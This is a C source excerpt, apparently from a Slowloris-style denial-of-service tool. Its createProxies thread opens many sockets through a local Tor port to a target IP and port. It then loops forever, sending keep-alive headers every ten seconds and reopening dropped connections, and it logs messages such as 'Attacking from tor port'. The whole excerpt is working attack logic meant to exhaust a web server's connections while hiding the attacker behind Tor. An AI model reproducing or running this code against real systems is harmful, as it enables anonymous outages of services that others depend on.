void* createProxies(void * tor_data){
  
  tor *tor_s;

  tor_s = (tor *) tor_data;
  int tor_port = (tor_s->tor_port);
  int socket_num = (tor_s->sockets_num);

  printf("Started sockets thread at tor port %d and total sockets to create are %d\n", tor_port, tor_s->sockets_num);

  struct sockaddr_in tor_server;
  int socket_fd;
  int* socket_list;
  socket_list = (int*) calloc(socket_num, sizeof(int));
  
  tor_server.sin_family = AF_INET;
  tor_server.sin_port = htons(tor_port);
  if (inet_pton(tor_server.sin_family, "127.0.0.1", &tor_server.sin_addr) <= 0){
    perror("Error in Tor address");
    exit(EXIT_FAILURE);
  }

  //printDashes();
  //printf("\nCreating sockets...\n");

  int sockets = 0;
  for (int i = 0; i < socket_num; i++){
    socket_fd = handleSocket(i, tor_server, tor_s->ip, tor_s->target_port);
    if (socket_fd > 0){ 
      for(int j=0; j < socket_num; j++){if (socket_list[j] <= 0){socket_list[j] = socket_fd;sockets++;break;}}
    }
  }

  printf("Attacking from tor port %d with %d sockets...\n", tor_port, sockets);

  //printf("\nEnd of creating sockets fot tor port %d...\n", tor_port);
  //printDashes();
  //printSocketArray(socket_list, socket_num);


  while (1){
     
    int send_alive = 0;
    for(int i = 0; i < socket_num; i++){
      if(socket_list[i] > 0)send_alive++;
    }
    printf("Sending keep alive headers for tor port %d and socket count %d\n", tor_port, send_alive);
    
    for(int i = 0; i < socket_num; i++){
    
      if(socket_list[i] <= 0){
	printf("Recreating socket with fd=%d for tor port %d..\n", socket_list[i], tor_port);
        socket_fd = handleSocket(i, tor_server, tor_s->ip, tor_s->target_port);
	if (socket_fd > 0){
          
          for (int j = 0; j < socket_num; j++){if(socket_list[j] <=0){socket_list[j] = socket_fd;break;}}
	  //printSocketArray(socket_list, socket_num);
        }
      }
      else{
        
        if (sendKeepAliveHeaders(socket_list[i]) == -1){socket_list[i] = -1;}
      }
    }  
    sleep(10); 
  }
  
  free(socket_list);

}

